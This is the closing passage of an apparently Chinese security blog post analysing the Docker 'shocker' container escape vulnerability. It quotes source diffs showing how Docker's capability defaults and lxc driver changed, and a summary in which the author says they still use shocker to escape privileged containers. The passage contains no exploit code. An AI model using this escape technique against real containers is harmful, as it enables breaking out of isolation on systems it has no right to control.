"SETPCAP":        false,
...
"MKNOD":          true,
"SYSLOG":         false,
+"SETUID":         true,
+"SETGID":         true,
+"CHOWN":          true,
+"NET_RAW":        true,
+"DAC_OVERRIDE":   true,
},
...
}
...
}
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/00GYaClAoOoLicicKhY2KCpwMXmflWClIErOYnjJiaSXvgNQOvibLI9MsNbUg8m3qqYzvmPicQv7a6DXEPZKYXeNlTAqUdCruVzRc/640?wx_fmt=svg&from=appmsg "")  
  
**lxc(dockerinit)**  
  
PR #6527 自 v1.0.1 起，将 lxc 的 capability 由黑名单变成了白名单。白名单直接调用 native 的实现。  
  
daemon/execdriver/lxc/driver.go  
  
```
func init() {
execdriver.RegisterInitFunc(DriverName, func(args *execdriver.InitArgs) error {
...
-if err := setupCapabilities(args); err != nil {
-return err
-}
-if err := setupWorkingDirectory(args); err != nil {
-return err
-}
-if err := system.CloseFdsFrom(3); err != nil {
-return err
-}
-if err := changeUser(args); err != nil {
-return err
-}
+if err := finalizeNamespace(args); err != nil {
...
})
}
```  
  
  
daemon/execdriver/lxc/lxc_init_linux.go  
  
```
import (
...
+"github.com/dotcloud/docker/daemon/execdriver/native/template"
...
)
...
+func finalizeNamespace(args *execdriver.InitArgs) error {
...
+container := template.New()
+
+if !args.Privileged {
+// drop capabilities in bounding set before changing user
+if err := dropBoundingSet(); err != nil {
+return fmt.Errorf("drop bounding set %s", err)
+}
+
+// preserve existing capabilities while we change users
+if err := system.SetKeepCaps(); err != nil {
+return fmt.Errorf("set keep caps %s", err)
+}
+}
...
+if !args.Privileged {
+if err := system.ClearKeepCaps(); err != nil {
+return fmt.Errorf("clear keep caps %s", err)
+}
+
+// drop all other capabilities
+if err := dropCapabilities(); err != nil {
+return fmt.Errorf("drop capabilities %s", err)
+}
+}
...
+}
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/00GYaClAoOoLicicKhY2KCpwMXmflWClIErOYnjJiaSXvgNQOvibLI9MsNbUg8m3qqYzvmPicQv7a6DXEPZKYXeNlTAqUdCruVzRc/640?wx_fmt=svg&from=appmsg "")  
  
**lxc**  
  
自 v0.7.2 起 capability 设置由 lxc 移动到了 lxc(dockerinit) ， 漏洞点消失。  
  
  
**9**  
  
**总结**  
  
  
本漏洞关键在于利用，默认Capability权限过大是在issues中讨论已久的问题，在默认拥有的Capability中寻找可用的利用技术即可。  
  
作为 docker 的第1个漏洞， shocker在容器漏洞史上有着不可磨灭的地位。实际上到今天，鉴于它的利用稳定性，在特权容器逃逸时我也还是愿意利用shocker作为一种逃逸技术。  
  
  
**10**  
  
**参考链接**  
  
  
https://seclists.org/oss-sec/2014/q2/565  
  
  
**本公众号发布、转载的文章所涉及的技术、思路、工具仅供学习交流，任何人不得将其用于非法用途及盈利等目的，否则后果自行承担！**  
  
**推荐阅读**  
  
[](http://mp.weixin.qq.com/s?__biz=MzI0MTY5NDQyMw==&mid=2247489220&idx=1&sn=aceaf6ab392674653be3a310c1bbb18c&chksm=e906f57cde717c6a639d2e82dd5a0d306dd34aaf9fb2874ddacfcf3468e04eb950c8fa846392&scene=21#wechat_redirect)  
  
[华为终端安全奖励计划诚邀您参与鸿蒙安全研究，赢取丰厚漏洞奖金](https://mp.weixin.qq.com/s?__biz=MzI0MTY5NDQyMw==&mid=2247524419&idx=1&sn=c4bd51d1e8e94c2b22a94c40e0bf6532&scene=21#wechat_redirect)  
  
  
  
[](http://mp.weixin.qq.com/s?__biz=MzI0MTY5NDQyMw==&mid=2247484735&idx=1&sn=4b003a3c5c8d711511b40d5f45437d22&chksm=e906e687de716f91b41b97daf76519d78cd81c19b4b4c330bbddf9105e4e5e3f0f74ebfeaffa&scene=21#wechat_redirect)  
  
  
  
点这里![](https://mmbiz.qpic.cn/mmbiz_gif/MfTd6rd9CyvNRMW8I9cvI1CK5gKiaYqg2veTn9t9dAe1GxYic7pAvgvRIKNFickConFyX8AvW2reAq8GchJI6aBpA/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
关注我们，一键三连～  
  
  
  
